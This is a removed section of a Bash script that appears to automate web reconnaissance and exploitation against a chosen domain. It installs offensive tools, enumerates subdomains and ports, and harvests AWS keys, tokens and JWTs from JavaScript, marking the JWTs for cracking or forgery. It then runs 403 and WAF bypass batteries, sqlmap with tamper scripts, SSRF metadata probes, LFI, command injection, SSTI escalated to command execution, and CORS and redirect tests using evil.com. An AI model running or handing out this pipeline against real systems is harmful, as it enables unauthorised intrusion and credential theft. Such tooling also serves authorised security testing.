-    && sudo tar -C /usr/local -xzf /tmp/go.tgz \
-    && echo 'export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin' >> ~/.bashrc \
-    && export PATH="$PATH:/usr/local/go/bin:$HOME/go/bin"; }
-  local PKGS=(subfinder httpx nuclei katana dnsx alterx naabu waybackurls gf anew qsreplace gau dalfox hakrawler ffuf getJS assetfinder gowitness)
-  for p in "${PKGS[@]}"; do
-    has "$p" || { go install "github.com/projectdiscovery/${p}/cmd/${p}@latest" 2>/dev/null \
-      || go install "github.com/tomnomnom/${p}@latest" 2>/dev/null \
-      || go install "github.com/hahwul/${p}/v2@latest" 2>/dev/null \
-      || go install "github.com/lc/${p}/v2/cmd/${p}@latest" 2>/dev/null \
-      || go install "github.com/ffuf/${p}/v2@latest" 2>/dev/null \
-      || go install "github.com/003random/${p}@latest" 2>/dev/null \
-      || log W "$p install failed"; }
-  done
-  pip3 install -q waymore uro arjun dirsearch wafw00f --break-system-packages 2>/dev/null || true
-  [[ -d "$HOME/tools/SecretFinder" ]] || { git clone -q https://github.com/m4ll0k/SecretFinder.git "$HOME/tools/SecretFinder" 2>/dev/null && pip3 install -qr "$HOME/tools/SecretFinder/requirements.txt" --break-system-packages 2>/dev/null; }
-  [[ -d "$HOME/tools/jwt_tool" ]] || { git clone -q https://github.com/ticarpi/jwt_tool.git "$HOME/tools/jwt_tool" 2>/dev/null && pip3 install -qr "$HOME/tools/jwt_tool/requirements.txt" --break-system-packages 2>/dev/null; }
-  [[ -d "$HOME/tools/LinkFinder" ]] || { git clone -q https://github.com/GerbenJavado/LinkFinder.git "$HOME/tools/LinkFinder" 2>/dev/null; }
-  [[ -d "$HOME/.gf" ]] || { mkdir -p ~/.gf; git clone -q --depth 1 https://github.com/1ndianl33t/Gf-Patterns.git /tmp/gfp 2>/dev/null && cp /tmp/gfp/*.json ~/.gf/ 2>/dev/null; git clone -q https://github.com/tomnomnom/gf.git /tmp/gfs 2>/dev/null && cp /tmp/gfs/examples/*.json ~/.gf/ 2>/dev/null; }
-  [[ -d "$HOME/nuclei-templates" ]] || nuclei -update-templates 2>/dev/null
-  [[ -f /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt ]] \
-    || sudo apt-get install -y -qq seclists 2>/dev/null \
-    || git clone -q --depth 1 https://github.com/danielmiessler/SecLists.git /usr/share/seclists 2>/dev/null
-  log OK "Install complete"
-}
-
-# ─────────────────────────── MOD 01 — RECON ───────────────────────────
-mod_recon() {
-  step "01 RECON — subs · resolve · probe · calibrate · ports"
-  local O="$W/subs"
-  if [[ "$M_ONE" == true ]]; then
-    echo "https://$DOMAIN" > "$O/live.txt"; echo "https://$DOMAIN" > "$O/status_200.txt"
-    echo "$DOMAIN" > "$O/all.txt"; touch "$O/status_403.txt" "$O/tech.txt"
-    while IFS= read -r u; do calibrate "$u"; done < <(head -10 "$O/live.txt"); return
-  fi
-  has subfinder && { log I "subfinder…"; subfinder -d "$DOMAIN" -silent -all -recursive -o "$O/subfinder.txt" 2>/dev/null || true; }
-  log I "crt.sh…"; curlx -- "https://crt.sh/?q=%25.${DOMAIN}&output=json" | jq -r '.[].name_value' 2>/dev/null | sed 's/\*\.//g' > "$O/crtsh.txt" || true
-  has assetfinder && { log I "assetfinder…"; assetfinder --subs-only "$DOMAIN" 2>/dev/null > "$O/assetfinder.txt" || true; }
-  log I "urlscan · rapiddns · hackertarget…"
-  curlx -- "https://urlscan.io/api/v1/search/?q=domain:${DOMAIN}&size=10000" | jq -r '.results[]?.page?.domain' 2>/dev/null | grep -F ".$DOMAIN" >> "$O/urlscan.txt" 2>/dev/null || true
-  curlx -- "https://rapiddns.io/subdomain/$DOMAIN?full=1" | grep -oE "[a-zA-Z0-9._-]+\.${DOMAIN}" >> "$O/rapiddns.txt" 2>/dev/null || true
-  curlx -- "https://api.hackertarget.com/hostsearch/?q=$DOMAIN" | cut -d',' -f1 >> "$O/hackertarget.txt" 2>/dev/null || true
-  if [[ "$F_QUICK" == false ]]; then
-    has amass && { log I "amass passive (120s cap)…"; timeout 120 amass enum -passive -d "$DOMAIN" -o "$O/amass.txt" -silent 2>/dev/null || true; }
-    has alterx && { log I "alterx permutations…"; cat "$O/subfinder.txt" 2>/dev/null | alterx -silent 2>/dev/null | head -5000 >> "$O/alterx.txt" 2>/dev/null || true; }
-  fi
-  cat "$O"/*.txt 2>/dev/null | sort -u | grep -E "^[a-zA-Z0-9]([a-zA-Z0-9._-]*)\.${DOMAIN}$" > "$O/all.txt"
-  log OK "Subdomains (unique): $(cnt "$O/all.txt")"
-  has dnsx && { log I "dnsx resolve…"; cat "$O/all.txt" | dnsx -silent -a -cname -resp -o "$O/resolved.txt" 2>/dev/null || true
-    awk '{print $1}' "$O/resolved.txt" > "$O/resolved_hosts.txt" 2>/dev/null || true; }
-  if grep -qiE "(github\.io|heroku|amazonaws|cloudfront|azurewebsites|netlify|surge\.sh|bitbucket\.io|fastly)" "$O/resolved.txt" 2>/dev/null; then
-    grep -iE "(github\.io|heroku|amazonaws|cloudfront|azurewebsites|netlify|surge\.sh|bitbucket\.io|fastly)" "$O/resolved.txt" > "$O/takeover_cands.txt"
-    log W "takeover candidates: $(cnt "$O/takeover_cands.txt")"
-  fi
-  has httpx && { log I "httpx fingerprint…"
-    { cat "$O/resolved_hosts.txt" "$O/all.txt" 2>/dev/null; echo "$DOMAIN"; } | sort -u \
-      | httpx -silent -status-code -title -tech-detect -content-length -web-server -ip -cdn \
-        -ports 80,443,8080,8443,8888,8000,3000,5000,9000 \
-        -threads "$T_HTTPX" -timeout "$TO" -follow-redirects \
-        ${COOKIE:+-H "Cookie: $COOKIE"} ${PROXY:+-http-proxy "$PROXY"} \
-        -json -o "$O/hosts.json" 2>/dev/null || true
-    jq -r '.url' "$O/hosts.json" 2>/dev/null | sort -u > "$O/live.txt"
-    for c in 200 301 302 401 403 404 500; do jq -r "select(.status_code==$c)|.url" "$O/hosts.json" 2>/dev/null | sort -u > "$O/status_$c.txt"; done
-    cp "$O/status_403.txt" "$W/paths/403_targets.txt" 2>/dev/null || true
-    jq -r '.tech[]?' "$O/hosts.json" 2>/dev/null | sort | uniq -c | sort -rn | head -40 > "$O/tech.txt"
-    log OK "Live (unique): $(cnt "$O/live.txt") | 200: $(cnt "$O/status_200.txt") | 403: $(cnt "$O/status_403.txt")"; }
-  while IFS= read -r u; do calibrate "$u"; done < <(head -10 "$O/live.txt" 2>/dev/null || true)
-  [[ "$F_QUICK" == false && "$F_DEEP" == true && -s "$O/resolved_hosts.txt" ]] && {
-    has naabu && { log I "naabu port scan…"; cat "$O/resolved_hosts.txt" | naabu -silent -top-ports 1000 -rate 1000 -o "$O/ports.txt" 2>/dev/null || true
-      log OK "Open ports: $(cnt "$O/ports.txt")"; }
-    has nmap && { log I "nmap top-1000…"; nmap -iL "$O/resolved_hosts.txt" --top-ports 1000 -T4 --open -sV --version-intensity 3 -oN "$O/nmap.txt" 2>/dev/null || true; }
-  }
-}
-
-# ─────────────────────────── MOD 02 — URL COLLECTION ───────────────────────────
-mod_urls() {
-  step "02 URL COLLECTION (all sources, deduped)"
-  local O="$W/urls"
-  has waybackurls && { log I "waybackurls…"
-    timeout 120 bash -c "echo '$DOMAIN' | waybackurls 2>/dev/null" > "$O/wayback.txt" || true
-    head -"$MAX_SUBS_WB" "$W/subs/resolved_hosts.txt" 2>/dev/null | while IFS= read -r s; do
-      timeout 25 bash -c "echo '$s' | waybackurls 2>/dev/null" 2>/dev/null || true
-    done >> "$O/wayback.txt" || true; }
-  has gau && { log I "gau…"; timeout 180 gau --subs --threads 10 --timeout 10 --blacklist "png,jpg,gif,ico,svg,woff,woff2,ttf,eot,css,mp4,zip" "$DOMAIN" 2>/dev/null > "$O/gau.txt" || true; }
-  has waymore && { log I "waymore…"; timeout 180 waymore -i "$DOMAIN" -mode U -oU "$O/waymore.txt" --timeout 30 2>/dev/null || true; }
-  curlx -- "https://urlscan.io/api/v1/search/?q=domain:${DOMAIN}&size=10000" | jq -r '.results[]?.page?.url' 2>/dev/null > "$O/urlscan.txt" || true
-  has katana && { log I "katana crawl (depth $D_KATANA)…"
-    timeout 180 katana -list "$W/subs/live.txt" -jc -kf all -d "$D_KATANA" -timeout 10 -c "$T_KATANA" \
-      ${COOKIE:+-H "Cookie: $COOKIE"} -silent -o "$O/katana.txt" 2>/dev/null || true
-    [[ "$F_HEADLESS" == true ]] && { timeout 180 katana -u "https://$DOMAIN" -headless -jc -kf all -d 2 -timeout 15 -c 20 -silent -o "$O/katana_h.txt" 2>/dev/null || true; cat "$O/katana_h.txt" >> "$O/katana.txt"; }; }
-  cat "$O"/*.txt 2>/dev/null | sort -u > "$O/all_raw.txt"
-  if has uro; then uro < "$O/all_raw.txt" 2>/dev/null > "$O/all.txt"; else cp "$O/all_raw.txt" "$O/all.txt"; fi
-  u "$O/all.txt"; log OK "Total URLs (unique): $(cnt "$O/all.txt")"
-  grep -E '\?[a-zA-Z0-9_%-]+=' "$O/all.txt" | sort -u > "$O/params.txt"
-  for p in xss sqli ssrf redirect lfi rce idor interestingparams; do
-    gf "$p" "$O/all.txt" 2>/dev/null | sort -u > "$O/gf/$p.txt"; u "$O/gf/$p.txt"
-  done
-  grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/params.txt" | sed 's/^[?&]//;s/=//' | sort -u > "$W/params/all.txt"
-  log OK "Param URLs: $(cnt "$O/params.txt") | unique params: $(cnt "$W/params/all.txt")"
-}
-
-# ─────────────────────────── MOD 03 — JS → PATHS ONLY ───────────────────────────
-mod_js_paths() {
-  step "03 JS ANALYSIS → PATHS ONLY (endpoints stripped, deduped)"
-  local O="$W/js"
-  grep -E '\.js(\?|$)' "$W/urls/all.txt" 2>/dev/null | grep -iE "$DOMAIN" | sort -u > "$O/js_urls.txt"
-  has getJS && { while IFS= read -r u; do getJS --url "$u" --complete 2>/dev/null | grep -E '\.js(\?|$)'; done < "$W/subs/live.txt" | sort -u >> "$O/js_urls.txt" || true; }
-  u "$O/js_urls.txt"; log OK "Unique JS files: $(cnt "$O/js_urls.txt")"
-  head -200 "$O/js_urls.txt" > /tmp/js_in_$$; python3 "$W/tools/js_dl.py" "$O/dl" /tmp/js_in_$$ >/dev/null 2>&1 || true; rm -f /tmp/js_in_$$
-  log OK "Downloaded: $(ls "$O/dl" 2>/dev/null | wc -l) files"
-  local JSALL=""
-  [[ -n "$(ls "$O/dl"/*.js 2>/dev/null)" ]] && JSALL=$(cat "$O/dl"/*.js 2>/dev/null)
-  if [[ -n "$JSALL" ]]; then
-    echo "$JSALL" | grep -oE 'AKIA[A-Z0-9]{16}' | sort -u > "$O/aws_keys.txt"
-    echo "$JSALL" | grep -oE 'AIza[0-9A-Za-z_-]{35}' | sort -u > "$O/gcp_keys.txt"
-    echo "$JSALL" | grep -oE 'eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*' | sort -u > "$O/jwts.txt"
-    echo "$JSALL" | grep -oiE '(api_?key|apikey|secret|password|passwd|token|auth_?token|access_?token|private_?key|client_?secret)["'"'"'\s]*[:=]["'"'"'\s]*["'"'"'][a-zA-Z0-9._/+\-]{8,}["'"'"']' | sort -u > "$O/secrets.txt"
-    echo "$JSALL" | grep -oE '(innerHTML|outerHTML|document\.write|\.html\(|eval\(|location\.href|location\.hash|document\.cookie)[^;,\n]{0,100}' | sort -u > "$O/dom_sinks.txt"
-    echo "$JSALL" | grep -oiE 'postMessage' | sort -u > "$O/postmsg.txt"
-    echo "$JSALL" | grep -oE '[a-zA-Z0-9_-]+\.s3[\.-][a-zA-Z0-9.-]*\.amazonaws\.com' | sort -u > "$O/s3.txt"
-    [[ -s "$O/aws_keys.txt" ]] && log H "AWS keys in JS: $(cnt "$O/aws_keys.txt")"
-    [[ -s "$O/secrets.txt" ]] && log H "Potential secrets in JS: $(cnt "$O/secrets.txt")"
-    [[ -s "$O/jwts.txt" ]] && log W "JWTs in JS: $(cnt "$O/jwts.txt") — will crack/forge"
-  else
-    for f in aws_keys gcp_keys jwts secrets dom_sinks postmsg s3; do touch "$O/$f.txt"; done
-  fi
-  [[ -f "$HOME/tools/SecretFinder/SecretFinder.py" ]] && find "$O/dl" -name '*.js' | head -100 | while IFS= read -r f; do
-    python3 "$HOME/tools/SecretFinder/SecretFinder.py" -i "$f" -o cli 2>/dev/null; done >> "$O/secrets_found.txt" 2>/dev/null || true
-  u "$O/secrets_found.txt"
-  python3 "$W/tools/js_paths.py" "$O/dl" "$DOMAIN" 2>/dev/null > "$O/paths/all.txt" || true
-  if [[ -f "$HOME/tools/LinkFinder/linkfinder.py" ]]; then
-    find "$O/dl" -name '*.js' | head -100 | while IFS= read -r f; do
-      python3 "$HOME/tools/LinkFinder/linkfinder.py" -i "$f" -o cli 2>/dev/null
-    done | grep -oE '^/[a-zA-Z0-9_./?=&%{}:@-]{2,}' >> "$O/paths/all.txt" || true
-  fi
-  u "$O/paths/all.txt"
-  grep -vE '^https?://' "$O/paths/all.txt" | sort -u > "$O/paths/clean.txt" 2>/dev/null
-  mv "$O/paths/clean.txt" "$O/paths/all.txt" 2>/dev/null || true
-  cat "$O/paths/all.txt" "$W/endpoints/all.txt" 2>/dev/null | sort -u > /tmp/end_$$; mv /tmp/end_$$ "$W/endpoints/all.txt" 2>/dev/null || true
-  log OK "Unique JS paths: $(cnt "$O/paths/all.txt") → $O/paths/all.txt"
-}
-
-# ─────────────────────────── MOD 04 — PATHS + 403 + PARAMS ───────────────────────────
-mod_paths() {
-  step "04 PATH DISCOVERY · 403 BYPASS · PARAM MINING"
-  local O="$W/paths"
-  ensure_live
-  local WL="/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt"
-  [[ -f "$CUSTOM_WL" ]] && WL="$CUSTOM_WL"; [[ ! -f "$WL" ]] && WL="/usr/share/wordlists/dirb/common.txt"
-  if has ffuf; then
-    log I "ffuf raft (top 20 hosts)…"
-    head -20 "$W/subs/live.txt" | while IFS= read -r t; do
-      ffuf -u "${t}/FUZZ" -w "$WL" -t "$T_FFUF" -mc 200,201,204,301,302,307,401,403,405,500 \
-        ${COOKIE:+-b "$COOKIE"} ${PROXY:+-x "$PROXY"} -of json -o "$O/ffuf_$(sn "$t").json" -s 2>/dev/null || true
-    done
-    local API_WL="/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt"; [[ ! -f "$API_WL" ]] && API_WL="$WL"
-    log I "ffuf api + sensitive files…"
-    ffuf -u "https://$DOMAIN/FUZZ" -w "$API_WL" -t "$T_FFUF" -mc 200,201,301,302,401,403 -of json -o "$O/api.json" -s 2>/dev/null || true
-    ffuf -u "https://$DOMAIN/FUZZ" -w "/usr/share/seclists/Discovery/Web-Content/raft-small-files.txt" -t "$T_FFUF" -mc 200,301,302 -of json -o "$O/files.json" -s 2>/dev/null || true
-    cat "$O"/ffuf_*.json "$O/api.json" "$O/files.json" 2>/dev/null | jq -r '.results[]?.url' 2>/dev/null | sort -u > "$W/endpoints/all.txt" || true
-    if [[ "$F_QUICK" == false ]]; then
-      log I "recursive ffuf on found dirs…"
-      grep -E '/$' "$W/endpoints/all.txt" | head -15 | while IFS= read -r d; do
-        ffuf -u "${d}FUZZ" -w "$WL" -t "$T_FFUF" -mc 200,204,301,302,401,403 -of json -o "$O/rec_$(sn "$d").json" -s 2>/dev/null || true
-      done
-      cat "$O"/rec_*.json 2>/dev/null | jq -r '.results[]?.url' 2>/dev/null >> "$W/endpoints/all.txt" || true
-    fi
-  fi
-  u "$W/endpoints/all.txt"
-  log I "403 bypass (${#PATH_TRICKS[@]} path × ${#HDR_BYPASS[@]} header tricks)…"
-  local BO="$O/403_bypass.txt"
-  while IFS= read -r u; do
-    local pth base; pth=$(echo "$u" | grep -oP "(?<=${DOMAIN}).*" || true); base=$(echo "$u" | grep -oP 'https?://[^/]+' || true)
-    [[ -z "$pth" || -z "$base" ]] && continue
-    for t in "${PATH_TRICKS[@]}"; do
-      probe "${base}${pth}${t}"
-      if [[ "$RC" == "200" ]]; then soft404 "${base}${pth}${t}" "$RB" || echo "PATH|${base}${pth}${t}" >> "$BO"; fi
-    done
-    for h in "${HDR_BYPASS[@]}"; do
-      local hv="${h//%P%/$pth}"
-      mkhdr; RC=$(curlx -H "$hv" -o /dev/null -w '%{http_code}' -- "$u" 2>/dev/null || echo 000)
-      [[ "$RC" == "200" ]] && echo "HDR|$hv|$u" >> "$BO"
-    done
-  done < "$W/paths/403_targets.txt" 2>/dev/null || true
-  u "$BO"; [[ -s "$BO" ]] && log H "403 BYPASSES (unique, non-baseline): $(cnt "$BO") → $BO"
-  has arjun && { log I "arjun param mining (top 40)…"
-    head -40 "$W/subs/status_200.txt" 2>/dev/null | while IFS= read -r u; do
-      arjun -u "$u" -oJ "$W/params/arjun_$(sn "$u").json" -t 20 -q 2>/dev/null || true
-    done
-    cat "$W/params"/arjun_*.json 2>/dev/null | jq -r '.params[]?' 2>/dev/null | sort -u >> "$W/params/all.txt" || true
-    u "$W/params/all.txt"; }
-  grep -iE "(admin|api/v[0-9]|graphql|swagger|actuator|debug|backup|config|secret|key|token|login|auth|dashboard|panel|manage|internal|dev|test|staging|upload|download|export|import|reset|forgot|webhook|payment|oauth|oidc|saml|sso|\.env|\.git|phpinfo|server-status|metrics|prometheus)" \
-    "$W/endpoints/all.txt" 2>/dev/null | sort -u > "$W/endpoints/interesting.txt"
-  log OK "Endpoints (unique): $(cnt "$W/endpoints/all.txt") | interesting: $(cnt "$W/endpoints/interesting.txt")"
-}
-
-# ─────────────────────────── MOD 05 — NUCLEI ───────────────────────────
-mod_nuclei() {
-  step "05 NUCLEI — full · cve · params · takeover"
-  has nuclei || { log W "nuclei missing — skip"; return; }
-  local O="$W/vulns/nuclei"; mkdir -p "$O"
-  nuclei -update-templates -silent 2>/dev/null || true
-  log I "nuclei full (t: $T_NUCLEI, r: $R_NUCLEI/s)…"
-  local NARGS=(-list "$W/subs/live.txt" -severity critical,high,medium,low,info
-    -tags "cve,rce,sqli,xss,lfi,ssrf,idor,auth,misconfig,exposure,token,default-login,panel,backup,debug,takeover,tech"
-    -c "$T_NUCLEI" -rate-limit "$R_NUCLEI" -timeout "$TO" -retries 2 -follow-redirects -stats
-    -json-export "$O/full.json" -o "$O/full.txt")
-  [[ -n "$COOKIE" ]] && NARGS+=(-H "Cookie: $COOKIE"); [[ -n "$PROXY" ]] && NARGS+=(-proxy "$PROXY")
-  nuclei "${NARGS[@]}" 2>/dev/null || true
-  jq -r 'select(.info.severity=="critical" or .info.severity=="high") | "[\(.info.severity|ascii_upcase)] [\(.info.name)] \(.host) \(.matched-at)"' "$O/full.json" 2>/dev/null | sort -u > "$O/critical_high.txt" || true
-  [[ -s "$O/critical_high.txt" ]] && log H "Nuclei crit/high (unique): $(cnt "$O/critical_high.txt")"
-  [[ -s "$W/urls/params.txt" ]] && nuclei -list "$W/urls/params.txt" -t "$HOME/nuclei-templates/dast" -t "$HOME/nuclei-templates/fuzzing" -c 30 -rate-limit 100 -silent -o "$O/params.txt" 2>/dev/null || true
-  nuclei -list "$W/subs/live.txt" -tags cve -c "$T_NUCLEI" -rate-limit 100 -silent -o "$O/cves.txt" 2>/dev/null || true
-  nuclei -list "$W/subs/live.txt" -tags takeover -silent -o "$O/takeover.txt" 2>/dev/null || true
-  u "$O/full.txt" "$O/critical_high.txt" "$O/cves.txt" "$O/takeover.txt" 2>/dev/null || true
-  while IFS= read -r h; do
-    h=$(echo "$h" | grep -oE 'https?://[^ ]+' | head -1 || echo "$h")
-    qverify "takeover" "$h" "nuclei-match" "high"
-  done < "$O/takeover.txt" 2>/dev/null || true
-  log OK "Nuclei findings (unique): $(cnt "$O/full.txt")"
-}
-
-# ─────────────────────────── MOD 06 — WAF ───────────────────────────
-mod_waf() {
-  [[ "$G_FULL" == false && "$M_WAF" == false ]] && return
-  [[ "$F_QUICK" == true && "$M_WAF" == false ]] && return
-  step "06 WAF fingerprint + encoder battery"
-  local O="$W/waf" MAIN; MAIN=$(head -1 "$W/subs/live.txt" 2>/dev/null); [[ -z "$MAIN" ]] && MAIN="https://$DOMAIN"
-  has wafw00f && { wafw00f "$MAIN" -a -o "$O/wafw00f.json" --format=json 2>/dev/null || true
-    jq -r '.detected[]?.waf' "$O/wafw00f.json" 2>/dev/null | sort -u > "$O/detected.txt" || true; }
-  mkhdr; local hdrs; hdrs=$(curlx -I -- "$MAIN" 2>/dev/null | tr '[:upper:]' '[:lower:]')
-  for sig in "cloudflare|cf-ray" "akamai|x-akamai" "aws|x-amzn-requestid" "imperva|x-iinfo" "f5|x-wa-info" "sucuri|x-sucuri" "fastly|x-fastly" "modsec|mod_security"; do
-    local w s; w="${sig%%|*}"; s="${sig#*|}"
-    echo "$hdrs" | grep -qiE "$s" && { echo "$w" >> "$O/detected.txt"; log W "WAF: $w (header)"; }
-  done
-  u "$O/detected.txt"
-  if [[ -s "$O/detected.txt" ]]; then
-    log I "WAF present — mutation encoder battery…"
-    for e in "${WAF_ENC[@]}"; do
-      probe "${MAIN}/?__t=${e}"
-      echo "$RB" | grep -qiE "(<script|onload|alert)" && echo "REFLECTED|$e" >> "$O/bypass_works.txt"
-      [[ "$RC" == "200" ]] && echo "PASSED|$e" >> "$O/bypass_passed.txt"
-    done
-    u "$O/bypass_works.txt" "$O/bypass_passed.txt"
-    log OK "Reflected: $(cnt "$O/bypass_works.txt") | passed: $(cnt "$O/bypass_passed.txt")"
-  else log OK "No WAF detected on $MAIN"; fi
-}
-
-# ─────────────────────────── MOD 07 — WEB VULN DETECT → QVERIFY → QUEUE ───────────────────────────
-mod_web() {
-  local O="$W/vulns" U="$W/urls" LIVE="$W/subs/live.txt"
-  mkdir -p "$O"/{xss,sqli/detect,ssrf,lfi,cmdi,ssti,csrf,redirect,idor}
-  if [[ "$M_XSS" == true || "$M_VULN" == true || "$G_FULL" == true ]]; then
-    step "07a XSS (dalfox → qverify → queue)"
-    has dalfox || log W "dalfox missing"
-    local XI="$U/gf/xss.txt"; [[ ! -s "$XI" ]] && XI="$U/params.txt"
-    head -500 "$XI" > /tmp/dx_$$ 2>/dev/null || true
-    timeout 300 dalfox file /tmp/dx_$$ --silence --skip-bav --no-color --worker "$T_DALFOX" \
-      --timeout 5 --delay 0 --only-discovery ${COOKIE:+--cookie "$COOKIE"} ${PROXY:+--proxy "$PROXY"} \
-      --output "$O/xss/dalfox.json" --format json 2>/dev/null || true
-    rm -f /tmp/dx_$$
-    jq -r 'select(.data."PoC"!=null or .data."payload"!=null) | "\(.data.url)\t\(.data."PoC" // .data.payload)"' "$O/xss/dalfox.json" 2>/dev/null | sort -u > "$O/xss/raw.txt" || true
-    while IFS=$'\t' read -r u p; do [[ -n "$u" ]] && qverify "xss" "$u" "$p" "high"; done < "$O/xss/raw.txt"
-    log OK "XSS verified: $(qcount xss)"
-  fi
-  if [[ "$M_SQLI" == true || "$M_VULN" == true || "$G_FULL" == true ]]; then
-    step "07b SQLi (sqlmap detect → qverify SLEEP → queue)"
-    has sqlmap || log W "sqlmap missing"
-    local SI="$U/gf/sqli.txt"; [[ ! -s "$SI" ]] && SI="$U/params.txt"
-    python3 "$W/tools/active.py" 30 < "$SI" 2>/dev/null | head -25 > /tmp/sqi_$$
-    if [[ -s /tmp/sqi_$$ ]]; then
-      timeout 600 sqlmap -m /tmp/sqi_$$ --batch --level=2 --risk=1 --random-agent --threads=5 --timeout=10 --retries=1 \
-        --tamper=space2comment,randomcase --no-cast --smart --ignore-code=403 \
-        --answers="follow=N,reduce=Y,normalize=Y,proceed=C,test=Y,integer=Y" \
-        ${COOKIE:+--cookie="$COOKIE"} ${PROXY:+--proxy="$PROXY"} \
-        --output-dir="$O/sqli/detect" 2>/dev/null || true
-      find "$O/sqli/detect" -name '*.log' -size +0c | while IFS= read -r f; do
-        grep -l "is vulnerable" "$f" 2>/dev/null && grep -oP "url: \K.*" "$f" | head -1
-      done | sort -u > "$O/sqli/injectable_raw.txt" || true
-      while IFS= read -r u; do [[ -n "$u" ]] && qverify "sqli" "$u" "sqlmap-injectable" "critical"; done < "$O/sqli/injectable_raw.txt"
-      log OK "SQLi verified: $(qcount sqli)"
-    else log W "no active SQLi targets"; fi
-    rm -f /tmp/sqi_$$
-  fi
-  if [[ "$M_SSRF" == true || "$M_VULN" == true || "$G_FULL" == true ]]; then
-    step "07c SSRF (metadata battery → qverify → queue)"
-    local SS="$U/gf/ssrf.txt"; [[ ! -s "$SS" ]] && SS="$U/params.txt"
-    while IFS= read -r u; do
-      for p in "${SSRF_P[@]}"; do
-        local t; t=$(echo "$u" | qsreplace "$p" 2>/dev/null)
-        probe -L "$t"
-        echo "$RB" | grep -qiE "(ami-id|computeMetadata|169\.254|ec2|arn:aws|meta-data|user-data)" && {
-          qverify "ssrf" "$t" "$p" "critical"; break; }
-      done
-    done < <(head -120 "$SS" 2>/dev/null)
-    log OK "SSRF verified: $(qcount ssrf)"
-  fi
-  if [[ "$M_LFI" == true || "$M_VULN" == true || "$G_FULL" == true ]]; then
-    step "07d LFI (payload battery → qverify root:x: → queue)"
-    local LI="$U/gf/lfi.txt"; [[ ! -s "$LI" ]] && LI="$U/params.txt"
-    while IFS= read -r u; do
-      for p in "${LFI_P[@]}"; do
-        local t; t=$(echo "$u" | qsreplace "$p" 2>/dev/null)
-        probe "$t"
-        if echo "$RB" | grep -qE "(root:x:|bin:x:|daemon:x:)"; then
-          qverify "lfi" "$t" "$p" "high"; break
-        fi
-      done
-    done < <(head -120 "$LI" 2>/dev/null)
-    log OK "LFI verified: $(qcount lfi)"
-  fi
-  if [[ "$F_QUICK" == false && ("$M_VULN" == true || "$G_FULL" == true) ]]; then
-    step "07e CMDi (time-based → qverify double-timing → queue)"
-    while IFS= read -r u; do
-      for p in "${CMDI_DET[@]}"; do
-        local t t2 t0 t1 base_ms p_ms
-        t=$(echo "$u" | qsreplace "$p" 2>/dev/null); t2=$(echo "$u" | qsreplace "x" 2>/dev/null)
-        t0=$(date +%s%N); probe "$t2"; t1=$(date +%s%N); base_ms=$(( (t1-t0)/1000000 ))
-        t0=$(date +%s%N); probe "$t"; t1=$(date +%s%N); p_ms=$(( (t1-t0)/1000000 ))
-        if [[ $((p_ms-base_ms)) -gt 2000 ]]; then
-          qverify "cmdi" "$t" "time-delay-${p_ms}ms" "critical"; break
-        fi
-      done
-    done < <(head -60 "$U/params.txt" 2>/dev/null)
-    log OK "CMDi verified: $(qcount cmdi)"
-  fi
-  if [[ "$M_PMF" == true || "$M_VULN" == true || "$G_FULL" == true ]]; then
-    step "07f SSTI (arithmetic → engine fingerprint → queue)"
-    while IFS= read -r u; do
-      for p in "${SSTI_PROBES[@]}"; do
-        local t; t=$(echo "$u" | qsreplace "$p" 2>/dev/null)
-        probe "$t"
-        if echo "$RB" | grep -qP '(^|[^0-9])49([^0-9]|$)' || echo "$RB" | grep -q "7777777"; then
-          local eng="unknown"
-          for entry in "${SSTI_RCE[@]}"; do
-            local e pl t2; e="${entry%%|*}"; pl="${entry#*|}"
-            t2=$(echo "$u" | qsreplace "$pl" 2>/dev/null); probe "$t2"
-            echo "$RB" | grep -qE "uid=[0-9]+" && { eng="$e"; break; }
-          done
-          qverify "ssti" "$t" "$eng" "critical"; break
-        fi
-      done
-    done < <(head -60 "$U/params.txt" 2>/dev/null)
-    log OK "SSTI verified: $(qcount ssti)"
-  fi
-  if [[ "$M_CSRF" == true || "$M_CORS" == true || "$M_VULN" == true || "$G_FULL" == true ]]; then
-    step "07g CSRF + CORS (form scrape + origin battery → qverify → queue)"
-    head -40 "$LIVE" 2>/dev/null | python3 "$W/tools/form_scrape.py" 2>/dev/null > "$O/csrf/forms.tsv" || true
-    while IFS=$'\t' read -r act mtd ins; do
-      [[ -z "$act" ]] && continue
-      probe "$act"
-      local tok; tok=$(echo "$RB" | grep -iE '(csrf|_token|authenticity_token|nonce|__requestverificationtoken)' | head -1 || true)
-      if [[ -z "$tok" && "$mtd" == "POST" ]]; then qverify "csrf" "$act" "$ins" "medium"; fi
-    done < "$O/csrf/forms.tsv" 2>/dev/null || true
-    for o in "https://evil.com" "https://attacker.$DOMAIN" "null" "https://$DOMAIN.evil.com" "https://evil$DOMAIN" "http://$DOMAIN"; do
-      while IFS= read -r u; do
-        mkhdr; local h; h=$(curlx -H "Origin: $o" -I -- "$u" 2>/dev/null || true)
-        local acao acac; acao=$(echo "$h" | grep -i 'access-control-allow-origin' | head -1 || true)
-        acac=$(echo "$h" | grep -i 'access-control-allow-credentials' | head -1 || true)
-        [[ -z "$acao" ]] && continue
-        if echo "$acao" | grep -qiE "(\*|evil\.com|null|${DOMAIN}\.evil|evil${DOMAIN}|attacker\.)"; then
-          local sev="medium"; echo "$acac" | grep -qi true && sev="high"
-          qverify "cors" "$u" "$o" "$sev"
-        fi
-      done < <(head -30 "$LIVE" 2>/dev/null)
-    done
-    log OK "CSRF verified: $(qcount csrf) | CORS verified: $(qcount cors)"
-  fi
-  if [[ "$M_VULN" == true || "$G_FULL" == true ]]; then
-    step "07h Open redirect (chain check → qverify evil.com → queue)"
-    local RI="$U/gf/redirect.txt"; [[ ! -s "$RI" ]] && RI="$U/params.txt"
-    while IFS= read -r u; do
-      for p in "${REDIRECT_P[@]}"; do
-        local t final; t=$(echo "$u" | qsreplace "$p" 2>/dev/null)
-        probe -L "$t"
-        final=$(curlx -o /dev/null -w '%{url_effective}' -- "$t" 2>/dev/null || true)
-        [[ -n "$final" ]] && echo "$final" | grep -qiE "^(https?://)?(www\.)?evil\.com" && {
-          qverify "redirect" "$t" "$final" "medium"; }
-      done
-    done < <(head -60 "$RI" 2>/dev/null)
-    log OK "Redirect verified: $(qcount redirect)"
-  fi
-}
-
